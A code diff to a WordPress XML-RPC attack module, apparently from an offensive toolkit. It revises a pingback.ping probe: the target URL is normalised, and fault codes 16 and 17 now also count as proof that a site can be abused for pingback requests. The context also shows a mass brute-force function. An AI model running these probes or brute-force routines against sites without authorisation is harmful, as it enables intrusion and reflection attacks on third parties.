@@ -2,6 +2,10 @@ import requests,random,json
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 from bane.payloads import ua
+if  sys.version_info < (3,0):
+ from urlparse import urlparse
+else:
+ from urllib.parse import urlparse
 
 def wp_xmlrpc_methods(u,user_agent=None,cookie=None,path='/xmlrpc.php',timeout=10,proxy=None):
  if proxy:
@@ -91,6 +95,7 @@ def wp_xmlrpc_mass_bruteforce(u,user_agent=None,cookie=None,path='/xmlrpc.php',t
 
 
 def wp_xmlrpc_pingback(u,user_agent=None,test_url="https://www.google.com/",cookie=None,path='/xmlrpc.php',timeout=10,proxy=None):
+ url=u.split('://')[0]+"://"+urlparse(u).netloc
  if proxy:
   proxy={'http':'http://'+proxy}
  if u[len(u)-1]=='/':
@@ -102,7 +107,7 @@ def wp_xmlrpc_pingback(u,user_agent=None,test_url="https://www.google.com/",cook
  hed={"User-Agent":us}
  if cookie:
   hed.update({"Cookie":cookie})
- u+=path
+ url+=path
  post ="""<?xml version="1.0" encoding="UTF-8"?>
 <methodCall>
 <methodName>pingback.ping</methodName>
@@ -117,8 +122,8 @@ def wp_xmlrpc_pingback(u,user_agent=None,test_url="https://www.google.com/",cook
 </methodCall>
 """
  try:
-  r = requests.post(u, data=post,headers = hed,proxies=proxy,timeout=timeout, verify=False)
-  if "<value><int>0</int></value>" in r.text:
+  r = requests.post(url, data=post,headers = hed,proxies=proxy,timeout=timeout, verify=False)
+  if ("<value><int>17</int></value>" in r.text) or ("<value><int>16</int></value>" in r.text) or ("<value><int>0</int></value>" in r.text):
    return True
  except:
   pass
